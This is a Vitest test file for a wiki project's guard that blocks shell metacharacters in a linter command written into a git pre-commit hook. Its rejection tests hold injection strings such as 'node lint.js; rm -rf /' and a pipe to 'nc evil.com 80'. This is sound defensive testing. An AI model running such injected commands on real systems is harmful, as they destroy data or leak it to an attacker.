// The wiki pre-commit hook splices `linterCommand` into a shell script. Today
// the value is hard-coded, but template-interpolation into a shell command is
// fragile — a future caller passing user data here would be an RCE. The guard
// at construction time keeps the failure mode loud.
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { WikiRepo, assertSafeLinterCommand } from "../../../src/wiki/repo.js";

describe("assertSafeLinterCommand", () => {
	it("accepts the production and test command shapes", () => {
		// WHY: the guard must not break the shapes already in use:
		// production: `node /app/server/dist/wiki/page_lint_cli.js`
		// tests:      `/path/to/node_modules/.bin/tsx /path/to/page_lint_cli.ts`
		expect(() => assertSafeLinterCommand("node /app/server/dist/wiki/page_lint_cli.js")).not.toThrow();
		expect(() =>
			assertSafeLinterCommand("/repo/node_modules/.bin/tsx /repo/server/src/wiki/page_lint_cli.ts"),
		).not.toThrow();
	});

	it("rejects shell metacharacters that would split or chain commands", () => {
		expect(() => assertSafeLinterCommand("node lint.js; rm -rf /")).toThrow();
		expect(() => assertSafeLinterCommand("node lint.js && touch pwned")).toThrow();
		expect(() => assertSafeLinterCommand("node lint.js | nc evil.com 80")).toThrow();
		expect(() => assertSafeLinterCommand("node `whoami`.js")).toThrow();
		expect(() => assertSafeLinterCommand("node $(whoami).js")).toThrow();
		expect(() => assertSafeLinterCommand('node "lint".js')).toThrow();
		expect(() => assertSafeLinterCommand("node lint.js\nmalicious")).toThrow();
	});

	it("rejects empty strings", () => {
		expect(() => assertSafeLinterCommand("")).toThrow();
	});
});

describe("WikiRepo constructor uses the guard", () => {
	let tmp: string;
	beforeEach(() => {
		tmp = mkdtempSync(join(tmpdir(), "assay-wiki-guard-"));
	});
	afterEach(() => {
		rmSync(tmp, { recursive: true, force: true });
	});

	it("throws synchronously when a future caller passes a tainted command", () => {
		// WHY: the failure must happen at construction, not at hook-write time —
		// that way startup fails loud rather than silently writing an attacker-
		// controlled script into .git/hooks/pre-commit.
		expect(
			() =>
				new WikiRepo({
					repoDir: tmp,
					seedDir: tmp,
					linterCommand: "node lint.js; rm -rf /",
				}),
		).toThrow(/shell metacharacters/);
	});
});
